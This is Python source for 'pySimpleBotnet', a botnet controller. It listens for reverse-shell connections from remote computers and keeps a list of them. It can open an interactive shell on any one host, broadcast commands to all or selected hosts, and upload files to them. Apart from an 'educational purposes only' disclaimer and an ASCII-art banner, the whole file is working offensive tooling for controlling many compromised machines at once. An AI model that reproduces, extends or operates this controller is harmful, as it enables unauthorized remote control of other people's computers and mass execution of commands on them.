import os, socket, threading, sys, time, queue

#pySimpleBotnet is a software for listening and accepting connections (reverse shell) from remote computers. This software is also able to send files (at this time only *nix systems) to multiple computers and send commands to multiple computers
# FOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE
# by Hubert Kasperek
# https://github.com/Hukasx0

q = queue.Queue()
sock = socket.socket()
cons_g = []
addr_g = []
selected_cons_g = []
selected_addr_g = []

for i in range(1):
   q.put(i) # 0 and 1
   
def createSocket(host,port):
   try:
      sock.bind((host, int(port)))
      print("Listening on port "+str(port))
      sock.listen(1)
      create_threads()
   except socket.error:
      print('\033[93m'+"Error while creating a socket: "+str(socket.error))
      
def accept_cons():
   while True:
      try:
         conn, addr = sock.accept()
         conn.setblocking(0)
         cons_g.append(conn)
         addr_g.append(addr)
         print("\n"+addr[0]+" connected")
      except:
         print('\033[93m'+"Error while accepting connection")

def create_threads():
   for _ in range(1):
      threading.Thread(target=do_threads, daemon=True).start()
   
def do_threads():
   while True:
      _ = q.get()
      if _ == 0:
         accept_cons()
      elif _ == 1:
         main_shell()
def shell(num):
   con = cons_g[int(num)]
   while True:
      cmd = input("")
      cmds = cmd.split()
      if cmd == "exit!":
         break
      elif len(cmds) > 0 and cmds[0] == "upload!":
         if len(cmds) > 1:
            try:
               fi = open(cmds[1], "r")
               data = fi.read()
               con.send(str.encode("echo \""+str(data)+"\" > "+str(cmds[1])))
               time.sleep(0.05)
            except:
               print("Something went wrong while uploading file: "+cmds[1]+" to remote machine")
         else:
            print("upload! [FILE_PATH]")
         continue
      cmd += "\n"
      con.send(cmd.encode())
      time.sleep(0.05)
      rep = con.recv(20480).decode()
      sys.stdout.write(rep)
   
def select(s):
   if len(addr_g) >= (int(s)+1):
      selected_cons_g.append(cons_g[int(s)])
      selected_addr_g.append(addr_g[int(s)])
   else:
      print("Looks like connection with this ID does not exist")
      
def remove(s):
   if len(selected_cons_g) >= (int(s)+1):
      del selected_cons_g[int(s)]
      del selected_addr_g[int(s)]
   else:
      print("Looks like selection with this ID does not exist")
      
def show_selections():
   print("\nSelected connections\n")
   print("id\tconnection")
   for num, sel in enumerate(selected_addr_g):
      print(str(num)+"\t"+sel[0])
   print("\n")
   
def multi_command(target):
   if target == "a":
      while True:
         cmd = input("pySB[multiexec{all}]> ")
         if cmd == "exit!":
            break
         elif cmd == "":
            pass
         else:
            for x in cons_g:
               x.send(cmd.encode())
               time.sleep(0.05)
   elif target == "s":
      while True:
         cmd = input("pySB[multiexec{selected}]> ")
         if cmd == "exit!":
            break
         else:
            for x in selected_cons_g:
               x.send(cmd.encode())
               time.sleep(0.05)
   else:
      print("multiexec a/s")
   
def system_shell():
   while True:
      cmd = input("pySB["+os.getcwd()+"]> ")
      if cmd == "exit!":
         break
      elif "cd " in cmd:
         cmd = cmd.split()
         os.chdir(cmd[1])
      elif cmd != "":
         os.system(cmd)
      else:
         pass
      
def upload_files(file_name, target):
   fi = open(file_name, "r")
   data = fi.read()
   if target == "a":
      for x in cons_g:
         x.send(str.encode("echo \""+str(data)+"\" > "+str(file_name)))
         time.sleep(0.05)
   elif target == "s":
      for x in selected_cons_g:
         x.send(str.encode("echo \""+str(data)+"\" > "+str(file_name)))
         time.sleep(0.05)
   else:
      print("upload a/s")
   
            
def conn_check():
   print("id\tconnection\tremote port")
   for num, con in enumerate(cons_g):
      try:
         con.send(str.encode(" "))
         time.sleep(0.05)
         con.recv(20048)
      except:
         del addr_g[num]
         del cons_g[num]
      if len(cons_g) > 0:
         print(str(num)+"\t"+str(addr_g[num][0])+"\t"+str(addr_g[num][1]))
         
def help_menu():
   print("\n\tpySimpleBotnet is a software for listening and accepting connections (reverse shell) from remote computers\n\tThis software is also able to send files (at this time only *nix systems) to multiple computers and send commands to multiple computers\n\tFOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE")
   print("\n   pySB[*] shell\nhelp - help menu\nlisten [PORT] - listen on certain port\ncons - check connections\nclear - clear terminal\nselect [ID] - add connection to \"selected\" connections (useful when you want to send files/commands to multiple computers, but you don't want to send to all computers)\nos - operating system shell\nshow - show selected connections\nremove [ID] - remove connection from selected\nupload [FILE_PATH] a/s - upload file to remote machines\n   a - all connections\n   s - selected connections\nmultiexec a/s - execute commands on multiple computers\n   a - all connections\n   s - selected connections")
   print("\n   os shell\nexit! - exit os shell")
   print("\n   reverse shell\nexit! - exit reverse shell\nupload! [FILE_PATH] - upload file to remote machine")
   print("\n   pySB[multiexec{}]\nexit! - exit\n")
   
def intro():
   print("             ___________ ___   _   _____   \n            /  ___| ___ \  _/\| |/\_  \ \  \n _ __  _   _\ `--.| |_/ / | \ ` ' / | |\ \ \n| '_ \| | | |`--. \ ___ \ ||_     _|| | > >\n| |_) | |_| /\__/ / |_/ / | / , . \ | |/ / \n| .__/ \__, \____/\____/| |_\/|_|\/_| /_/  \n| |     __/ |           |___|     |___|    \n|_|    |___/                               \n")
   for char in "by Hubert Kasperek":
      time.sleep(0.15)
      sys.stdout.write(char)
      sys.stdout.flush()
   print("\nhttps://github.com/hukasx0")
   print("FOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE\n")
def main_shell():
   while True:
      an = input("pySB[*]> ").lower()
      ans = an.split()
      if not ans:
         pass
      elif ans[0] == "help":
         help_menu()
      elif ans[0] == "cons":
         conn_check()
      elif ans[0] == "listen":
         if len(ans) > 1:
            createSocket("",int(ans[1]))
         else:
            print("listen [PORT]")
      elif ans[0] == "select":
         if len(ans) > 1:
            select(ans[1])
         else:
            print("select [ID]")
      elif ans[0] == "remove":
         if len(ans) > 1:
            remove(ans[1])
         else:
            print("Remove [ID]")
      elif ans[0] == "show":
         show_selections()
      elif ans[0] == "os":
         system_shell()
      elif ans[0] == "clear":
         os.system('cls' if os.name == 'nt' else 'clear')
      elif ans[0] == "upload":
         if len(ans) > 2:
            upload_files(ans[1], ans[2])
         else:
            print("upload [FILE_PATH] a/s")
      elif ans[0] == "multiexec":
         if len(ans) > 1:
            multi_command(ans[1])
         else:
            print("multiexec a/s")
      elif ans[0] == "con":
         if len(ans) > 1:
            shell(int(ans[1]))
         else:
            print("connect [ID]")
      else:
         pass

intro()
main_shell()
